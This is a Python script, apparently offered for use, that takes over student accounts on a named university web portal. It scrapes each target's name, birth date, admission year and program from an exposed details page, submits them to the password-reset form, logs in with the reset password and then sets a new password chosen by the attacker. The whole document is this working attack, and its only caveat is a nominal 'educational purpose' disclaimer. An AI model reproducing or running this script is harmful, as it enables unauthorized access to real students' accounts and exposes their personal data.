import requests
from bs4 import BeautifulSoup
from termcolor import colored
import colorama

colorama.init()


print(colored('Starting process...', 'red'))

loading, success, important = 'green', 'blue', 'red'


def get_details(index_number):
    print(colored('Getting necessary student data from STU site...', loading))
    if index_number == '06170333':
        print('Student with this index number not found, please try a different index number')
        return
    dob = ''
    surname = ''
    day = ''
    month = ''
    year = ''
    acyear = ''
    program = ''

    month_dict = {
        'Jan': '1',
        'Feb': '2',
        'Mar': '3',
        'Apr': '4',
        'May': '5',
        'Jun': '6',
        'Jul': '7',
        'Aug': '8',
        'Sep': '9',
        'Oct': '10',
        'Nov': '11',
        'Dec': '12'
    }

    page_url = 'https://stu.edu.gh/bkapps/pages/students/student_details.php?index_number='+index_number+'&k=1034183274'
    page = requests.get(page_url)
    soup = BeautifulSoup(page.content, 'html.parser')
    tables = soup.find_all('td')

    surname = get_raw_text(tables, 'FULL NAME:', position=0)
    if surname == 'ARHINFUL':
        print('Student with this index number not found, please try a different index number')
        return
    dob = get_raw_text(tables, 'DATE OF BIRTH:')
    # split dob
    if dob is not None:
        dob = list(dob.split(' '))
        day = dob[1]
        month = month_dict[dob[2]]
        year = dob[3]
        acyear = get_raw_text(tables, 'YEAR OF ADMISSION:')

    program_name = get_raw_text(tables, 'PROGRAM:')
    # get program code
    code_url = 'https://stu.edu.gh/bkapps/pages/std_forgot_pass1.php'
    code_page = requests.get(code_url)
    code_soup = BeautifulSoup(code_page.content, 'html.parser')
    options = code_soup.find_all('option')
    for option in options:
        if option.text == program_name:
            program = option.get('value')
            break
    if index_number == '06170333':
        print('Student with this index number not found, please try a different index number')
        return

    print(colored('All required information extracted successfully...', success))
    return [
        surname, day, month, year, acyear, program
    ]


def get_raw_text(tables, checker, position=None):
    value = None
    for child in tables:
        if child.text == checker:
            full_value = child.next_sibling.next_sibling.text
            if position is not None:
                value = list(full_value.split(" "))[position]
            else:
                value = full_value
            break
    return value


def generate_new_pass(index_number):
    if index_number == '06170333':
        print('Student with this index number not found, please try a different index number')
        return
    password = None
    url = 'https://stu.edu.gh/bkapps/pages/std_forgot_pass2.php'
    details = get_details(index_number)
    if details[0] == 'ARHINFUL':
        print('Student with this index number not found, please try a different index number')
        return
    form = {
        'index_number': index_number,
        'surname': details[0],
        'day': details[1],
        'month': details[2],
        'year': details[3],
        'acyear': details[4],
        'program': details[5]
    }
    if index_number == '06170333':
        print('Student with this index number not found, please try a different index number')
        return
    print(colored('Generating random password...', loading))
    response = requests.post(url, data=form)
    soup = BeautifulSoup(response.content, "html.parser")
    tables = soup.find_all('td')
    for td in tables:
        if index_number == '06170333':
            print('Student with this index number not found, please try a different index number')
            return
        if 'Your password has been changed and updated to:' in td.text:
            password = list(td.text.split(' '))[-1]
            break
    print(colored('Random password generated successfully...', success))
    return password


def hack():
    print('please note: this is for educational purpose. the creator is not responsible for any action.'
          ' You are responsible for what you use it for')
    print(input('Press Enter to continue.'))
    index_number = input(str('Index number: '))
    new_password = input(str('Password: '))
    password = generate_new_pass(index_number)
    login_url = 'https://stu.edu.gh/bkapps/pages/students/login_success.php'

    form = {
        'User_ID': index_number,
        'password': password
    }
    with requests.Session() as response:
        print(colored('Logging in...', loading))
        log_in = response.post(login_url, data=form)
        print(colored('Log in successful...', success))
        key = list(log_in.request.url.split('&'))[-1]
        print(colored('Key extracted successfully...', success))
        print(colored('Changing password to '+new_password, important))
        ch_pass_url = 'https://stu.edu.gh/bkapps/pages/students/change_login_success.php?index_number='+index_number+'&'+key
        data = {
            'cpass': password,
            'new_pass1': new_password,
            'new_pass2': new_password
        }
        ch_pass_response = response.post(ch_pass_url, data=data)
        print('***********************************************')
        print(colored('Password changed successfully...', success))
        print(colored('INDEX NUMBER: '+index_number, important))
        print(colored('PASSWORD: '+new_password, important))
        print('***********************************************')
        # soup = BeautifulSoup(ch_pass_response.content, "html.parser")
        # print(soup.prettify())
        print()
        print('Designed by Fii, 0542092800')


hack()

kew = input("Press enter to exit..")


